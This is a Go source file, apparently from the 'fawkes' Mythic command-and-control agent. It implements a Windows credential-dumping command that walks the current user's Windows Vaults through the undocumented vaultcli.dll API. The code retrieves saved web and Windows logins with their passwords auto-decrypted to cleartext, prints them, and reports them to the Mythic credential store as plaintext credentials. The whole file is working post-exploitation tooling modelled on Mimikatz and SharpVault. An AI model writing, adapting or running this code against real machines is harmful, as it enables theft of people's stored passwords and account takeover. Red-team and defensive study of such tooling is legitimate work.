//go:build windows

package commands

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Windows Vault API (vaultcli.dll) — undocumented but stable since Windows 7.
// Stores credentials separately from the legacy Credential Manager: web logins
// from Edge/IE, Microsoft account sign-ins, and various Passport-class items.
// VaultGetItem auto-decrypts the authenticator element for the calling user
// (DPAPI under the hood), so cleartext passwords are returned without an
// explicit DPAPI step.
//
// References:
//   - SharpDPAPI / SharpVault (GhostPack)
//   - Mimikatz vault module (kuhl_m_vault.c)
//   - VAULT_ITEM_W8 struct layout from public reverse-engineering
var (
	vaultcli                 = windows.NewLazySystemDLL("vaultcli.dll")
	procVaultEnumerateVaults = vaultcli.NewProc("VaultEnumerateVaults")
	procVaultOpenVault       = vaultcli.NewProc("VaultOpenVault")
	procVaultCloseVault      = vaultcli.NewProc("VaultCloseVault")
	procVaultEnumerateItems  = vaultcli.NewProc("VaultEnumerateItems")
	procVaultGetItem         = vaultcli.NewProc("VaultGetItem")
	procVaultFree            = vaultcli.NewProc("VaultFree")
)

// VAULT_ELEMENT_TYPE values
const (
	vaultElemBoolean        = 0
	vaultElemShort          = 1
	vaultElemUnsignedShort  = 2
	vaultElemInteger        = 3
	vaultElemUnsignedInt    = 4
	vaultElemDouble         = 5
	vaultElemGuid           = 6
	vaultElemString         = 7
	vaultElemByteArray      = 8
	vaultElemTimeStamp      = 9
	vaultElemProtectedArray = 10
	vaultElemAttribute      = 11
	vaultElemSid            = 12
	vaultElemUndefined      = 13
)

// vaultItemW8 mirrors the Windows 8+ VAULT_ITEM_W layout (x64).
// Fixed offsets (bytes):
//
//	 0: SchemaId             GUID                        (16)
//	16: FriendlyName         LPWSTR                      ( 8)
//	24: Resource             *VAULT_ITEM_ELEMENT         ( 8)
//	32: Identity             *VAULT_ITEM_ELEMENT         ( 8)
//	40: Authenticator        *VAULT_ITEM_ELEMENT         ( 8)
//	48: PackageSid           *VAULT_ITEM_ELEMENT         ( 8)  (Win8+)
//	56: LastModified         FILETIME                    ( 8)
//	64: Flags                DWORD                       ( 4)
//	68: PropertiesCount      DWORD                       ( 4)
//	72: Properties           *VAULT_ITEM_ELEMENT         ( 8)
//
// Total: 80 bytes.
type vaultItemW8 struct {
	SchemaID        windows.GUID
	FriendlyName    *uint16
	Resource        *vaultItemElement
	Identity        *vaultItemElement
	Authenticator   *vaultItemElement
	PackageSid      *vaultItemElement
	LastModified    windows.Filetime
	Flags           uint32
	PropertiesCount uint32
	Properties      *vaultItemElement
}

const sizeofVaultItemW8 = 80

// vaultItemElement mirrors VAULT_ITEM_ELEMENT on x64.
//
// Layout:
//
//	 0: SchemaElementId      DWORD     (4)
//	 4: Type                 DWORD     (4)  (VAULT_ELEMENT_TYPE)
//	 8: ItemValue            union     (16, 8-byte aligned)
//
// Total: 24 bytes. The union holds either a pointer (LPWSTR), an inline value
// (e.g. INT), or a VAULT_BYTE_BUFFER (Length + pointer = 16 bytes). We model
// the header explicitly and read the union via unsafe pointer arithmetic.
type vaultItemElement struct {
	SchemaElementID uint32
	Type            uint32
	UnionLow        uint64 // first 8 bytes of union (pointer or value)
	UnionHigh       uint64 // second 8 bytes (used by VAULT_BYTE_BUFFER)
}

// vaultByteBuffer mirrors VAULT_BYTE_BUFFER (used by ByteArray, ProtectedArray, Attribute, Sid).
//
//	0: Length    DWORD   (4)
//	4: padding           (4)
//	8: Value     PBYTE   (8)
//
// Total: 16 bytes.
type vaultByteBuffer struct {
	Length uint32
	_pad   uint32
	Value  *byte
}

// Well-known vault GUIDs. Names mirror Mimikatz's table; lookup is best-effort
// — any unknown vault GUID is rendered as its raw GUID string.
var knownVaultGUIDs = map[string]string{
	"{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}": "Web Credentials",
	"{77BC582B-F0A6-4E15-4E80-61736B6F3B29}": "Windows Credentials",
	"{154E23E0-6F30-49CB-AB42-9B33D3E2B1CB}": "Passport",
}

// Common credential schema GUIDs that appear in vault items.
var knownVaultSchemas = map[string]string{
	"{3CCD5499-87A8-4B10-A215-608888DD3B55}": "Web Password Credential",
	"{154E23E0-6F30-49CB-AB42-9B33D3E2B1CB}": "Passport Account",
	"{3E0E35BE-1B77-43E7-B873-AED901B6275B}": "Windows Sign-In",
	"{B2E033F5-5FDE-450D-A1BD-3791F6E48A0E}": "Web Form Credentials",
	"{E69D7838-91B5-4FC9-89D5-230D4D4CC2BC}": "Domain User Credentials",
}

// credmanVaultEnumerate is the entry point for `credman -action vault`.
// Walks every vault registered for the current user, enumerates items, and
// fetches each item to surface the (auto-decrypted) authenticator.
func credmanVaultEnumerate(filter string) structs.CommandResult {
	vaults, err := vaultEnumerateVaults()
	if err != nil {
		return errorf("VaultEnumerateVaults failed: %v\nNote: Vault enumeration requires an interactive logon — DPAPI cannot decrypt items in service / SSH contexts.", err)
	}
	if len(vaults) == 0 {
		return successResult("No Windows vaults registered for current user.")
	}

	var lines []string
	lines = append(lines, fmt.Sprintf("=== Windows Vault Enumeration (%d vault(s)) ===\n", len(vaults)))

	var mythicCreds []structs.MythicCredential
	totalItems := 0

	for _, vg := range vaults {
		vaultGUIDStr := guidToString(&vg)
		vaultName := knownVaultGUIDs[vaultGUIDStr]
		if vaultName == "" {
			vaultName = "Unknown Vault"
		}

		lines = append(lines, fmt.Sprintf("--- Vault: %s %s ---", vaultName, vaultGUIDStr))

		handle, err := vaultOpenVault(&vg)
		if err != nil {
			lines = append(lines, fmt.Sprintf("  [error] VaultOpenVault: %v\n", err))
			continue
		}

		items, err := vaultEnumerateItems(handle)
		if err != nil {
			lines = append(lines, fmt.Sprintf("  [error] VaultEnumerateItems: %v\n", err))
			vaultCloseVault(handle)
			continue
		}

		if len(items) == 0 {
			lines = append(lines, "  (no items)")
			lines = append(lines, "")
			vaultCloseVault(handle)
			continue
		}

		for i := range items {
			it := &items[i]
			parsed := parseVaultItem(it)

			// Skip if filter set and no fields contain it
			if filter != "" {
				match := strings.Contains(strings.ToLower(parsed.Resource), strings.ToLower(filter)) ||
					strings.Contains(strings.ToLower(parsed.Identity), strings.ToLower(filter)) ||
					strings.Contains(strings.ToLower(parsed.FriendlyName), strings.ToLower(filter))
				if !match {
					continue
				}
			}

			// Re-fetch full item to populate authenticator (cleartext).
			full, err := vaultGetItem(handle, it)
			if err == nil && full != nil {
				parsed = parseVaultItem(full)
				vaultFree(unsafe.Pointer(full))
			}

			totalItems++
			lines = append(lines, fmt.Sprintf("  [#%d] Schema:        %s", totalItems, parsed.SchemaName))
			if parsed.FriendlyName != "" {
				lines = append(lines, fmt.Sprintf("       Friendly:      %s", parsed.FriendlyName))
			}
			if parsed.Resource != "" {
				lines = append(lines, fmt.Sprintf("       Resource:      %s", parsed.Resource))
			}
			if parsed.Identity != "" {
				lines = append(lines, fmt.Sprintf("       Identity:      %s", parsed.Identity))
			}
			if parsed.Authenticator != "" {
				lines = append(lines, fmt.Sprintf("       Authenticator: %s", parsed.Authenticator))
			} else if parsed.AuthenticatorRaw {
				lines = append(lines, "       Authenticator: [protected, decryption requires interactive user context]")
			}
			if parsed.PackageSid != "" {
				lines = append(lines, fmt.Sprintf("       PackageSID:    %s", parsed.PackageSid))
			}
			if parsed.LastModified != "" {
				lines = append(lines, fmt.Sprintf("       LastModified:  %s", parsed.LastModified))
			}
			lines = append(lines, "")

			// Register to Mythic credential vault if we have an identity + authenticator.
			if parsed.Identity != "" && parsed.Authenticator != "" {
				realm := parsed.Resource
				if realm == "" {
					realm = vaultName
				}
				mythicCreds = append(mythicCreds, structs.MythicCredential{
					CredentialType: "plaintext",
					Realm:          realm,
					Account:        parsed.Identity,
					Credential:     parsed.Authenticator,
					Comment:        fmt.Sprintf("vault %s (%s)", vaultName, parsed.SchemaName),
				})
			}
			pwd := parsed.Authenticator
			structs.ZeroString(&pwd)
		}

		vaultFree(unsafe.Pointer(&items[0])) // Free the items array allocated by VaultEnumerateItems.
		vaultCloseVault(handle)
		lines = append(lines, "")
	}

	lines = append(lines, fmt.Sprintf("Summary: %d vault(s), %d item(s) total, %d credential(s) registered to Mythic vault",
		len(vaults), totalItems, len(mythicCreds)))

	result := structs.CommandResult{
		Output:    strings.Join(lines, "\n"),
		Status:    "success",
		Completed: true,
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}
	return result
}

// vaultParsedItem holds extracted, friendly-formatted fields from a VAULT_ITEM_W.
type vaultParsedItem struct {
	SchemaGUID       string
	SchemaName       string
	FriendlyName     string
	Resource         string
	Identity         string
	Authenticator    string
	AuthenticatorRaw bool // true when authenticator element exists but cleartext unavailable
	PackageSid       string
	LastModified     string
}

// parseVaultItem extracts the friendly fields from a VAULT_ITEM_W struct.
// Designed to be safe against nil element pointers — vaults often omit
// PackageSid or PropertyElements.
func parseVaultItem(it *vaultItemW8) vaultParsedItem {
	out := vaultParsedItem{}
	if it == nil {
		return out
	}

	out.SchemaGUID = guidToString(&it.SchemaID)
	out.SchemaName = knownVaultSchemas[out.SchemaGUID]
	if out.SchemaName == "" {
		out.SchemaName = out.SchemaGUID
	}
	if it.FriendlyName != nil {
		out.FriendlyName = windows.UTF16PtrToString(it.FriendlyName)
	}
	out.Resource, _ = elementToString(it.Resource)
	out.Identity, _ = elementToString(it.Identity)
	auth, hasAuth := elementToString(it.Authenticator)
	out.Authenticator = auth
	out.AuthenticatorRaw = hasAuth && auth == ""
	out.PackageSid, _ = elementToString(it.PackageSid)
	out.LastModified = filetimeString(it.LastModified)
	return out
}

// elementToString renders a VAULT_ITEM_ELEMENT to a printable string.
// Returns (value, present): present indicates the element pointer was non-nil
// even if the value is empty/binary/unsupported.
func elementToString(elem *vaultItemElement) (string, bool) {
	if elem == nil {
		return "", false
	}
	switch elem.Type {
	case vaultElemString:
		// UnionLow holds LPWSTR
		if elem.UnionLow == 0 {
			return "", true
		}
		return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(uintptr(elem.UnionLow)))), true

	case vaultElemByteArray, vaultElemProtectedArray, vaultElemAttribute:
		// VAULT_BYTE_BUFFER: Length (UnionLow low 32 bits), padding, Value (UnionHigh)
		length := uint32(elem.UnionLow & 0xFFFFFFFF)
		ptr := elem.UnionHigh
		if length == 0 || ptr == 0 {
			return "", true
		}
		raw := unsafe.Slice((*byte)(unsafe.Pointer(uintptr(ptr))), int(length))
		// Try UTF-16LE decode (most string-like buffers come back this way after VaultGetItem).
		if length >= 2 && length%2 == 0 {
			u16 := unsafe.Slice((*uint16)(unsafe.Pointer(uintptr(ptr))), int(length)/2)
			decoded := windows.UTF16ToString(u16)
			if decoded != "" && isPrintable(decoded) {
				return decoded, true
			}
		}
		// Fallback: ASCII bytes.
		s := string(raw)
		if isPrintable(s) {
			return s, true
		}
		return "", true

	case vaultElemSid:
		// VAULT_BYTE_BUFFER pointing at a SID structure.
		ptr := elem.UnionHigh
		if ptr == 0 {
			return "", true
		}
		sid := (*windows.SID)(unsafe.Pointer(uintptr(ptr)))
		return sid.String(), true

	case vaultElemGuid:
		// GUID is inline in the union (16 bytes).
		// Reconstruct from UnionLow + UnionHigh treated as 16 raw bytes.
		var raw [16]byte
		*(*uint64)(unsafe.Pointer(&raw[0])) = elem.UnionLow
		*(*uint64)(unsafe.Pointer(&raw[8])) = elem.UnionHigh
		g := (*windows.GUID)(unsafe.Pointer(&raw[0]))
		return guidToString(g), true

	case vaultElemBoolean:
		if elem.UnionLow != 0 {
			return "true", true
		}
		return "false", true

	case vaultElemShort, vaultElemUnsignedShort, vaultElemInteger, vaultElemUnsignedInt:
		return fmt.Sprintf("%d", uint32(elem.UnionLow&0xFFFFFFFF)), true

	default:
		return "", true
	}
}

// vaultEnumerateVaults wraps VaultEnumerateVaults(0, &count, &arr).
func vaultEnumerateVaults() ([]windows.GUID, error) {
	var count uint32
	var arr uintptr
	r, _, _ := procVaultEnumerateVaults.Call(
		0,
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&arr)),
	)
	if r != 0 {
		return nil, fmt.Errorf("HRESULT 0x%x", uint32(r))
	}
	if count == 0 || arr == 0 {
		return nil, nil
	}
	defer procVaultFree.Call(arr)
	guids := unsafe.Slice((*windows.GUID)(unsafe.Pointer(arr)), int(count))
	out := make([]windows.GUID, int(count))
	copy(out, guids)
	return out, nil
}

// vaultOpenVault wraps VaultOpenVault(&guid, 0, &handle).
func vaultOpenVault(g *windows.GUID) (windows.Handle, error) {
	var handle windows.Handle
	r, _, _ := procVaultOpenVault.Call(
		uintptr(unsafe.Pointer(g)),
		0,
		uintptr(unsafe.Pointer(&handle)),
	)
	if r != 0 {
		return 0, fmt.Errorf("HRESULT 0x%x", uint32(r))
	}
	return handle, nil
}

// vaultCloseVault wraps VaultCloseVault(&handle).
func vaultCloseVault(h windows.Handle) {
	procVaultCloseVault.Call(uintptr(unsafe.Pointer(&h)))
}

// vaultEnumerateItems wraps VaultEnumerateItems(handle, 0x1000, &count, &arr).
// Flag 0x1000 is the documented "all credentials" flag observed in
// SharpDPAPI/Mimikatz. Returns a slice over the API-allocated array; the
// caller frees with vaultFree on the first element pointer.
func vaultEnumerateItems(handle windows.Handle) ([]vaultItemW8, error) {
	var count uint32
	var arr uintptr
	r, _, _ := procVaultEnumerateItems.Call(
		uintptr(handle),
		0x1000,
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&arr)),
	)
	if r != 0 {
		return nil, fmt.Errorf("HRESULT 0x%x", uint32(r))
	}
	if count == 0 || arr == 0 {
		return nil, nil
	}
	// Slice over the API-managed buffer. We do NOT copy because we need stable
	// pointers for VaultGetItem (which references Resource / Identity from the
	// enumerated item to look the full record up).
	return unsafe.Slice((*vaultItemW8)(unsafe.Pointer(arr)), int(count)), nil
}

// vaultGetItem wraps the Windows 8+ 8-arg VaultGetItem signature.
// Returns a pointer to a freshly-allocated VAULT_ITEM_W; caller frees with
// vaultFree.
func vaultGetItem(handle windows.Handle, src *vaultItemW8) (*vaultItemW8, error) {
	var item *vaultItemW8
	r, _, _ := procVaultGetItem.Call(
		uintptr(handle),
		uintptr(unsafe.Pointer(&src.SchemaID)),
		uintptr(unsafe.Pointer(src.Resource)),
		uintptr(unsafe.Pointer(src.Identity)),
		uintptr(unsafe.Pointer(src.PackageSid)),
		0, // hwndOwner
		0, // flags
		uintptr(unsafe.Pointer(&item)),
	)
	if r != 0 {
		return nil, fmt.Errorf("HRESULT 0x%x", uint32(r))
	}
	return item, nil
}

// vaultFree wraps VaultFree(memory).
func vaultFree(p unsafe.Pointer) {
	if p == nil {
		return
	}
	procVaultFree.Call(uintptr(p))
}

// guidToString renders a windows.GUID in {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
// uppercase form to match the well-known table keys.
func guidToString(g *windows.GUID) string {
	if g == nil {
		return ""
	}
	return strings.ToUpper(fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		g.Data1, g.Data2, g.Data3,
		g.Data4[0], g.Data4[1],
		g.Data4[2], g.Data4[3], g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7]))
}

// filetimeString formats a Windows FILETIME to "YYYY-MM-DD HH:MM:SS UTC" or
// returns "" when the timestamp is zero / invalid.
func filetimeString(ft windows.Filetime) string {
	val := int64(ft.HighDateTime)<<32 | int64(ft.LowDateTime)
	if val <= 0 {
		return ""
	}
	const epochDelta = int64(11644473600)
	secs := val/10000000 - epochDelta
	if secs < 0 || secs > 32503680000 {
		return ""
	}
	return time.Unix(secs, 0).UTC().Format("2006-01-02 15:04:05 UTC")
}
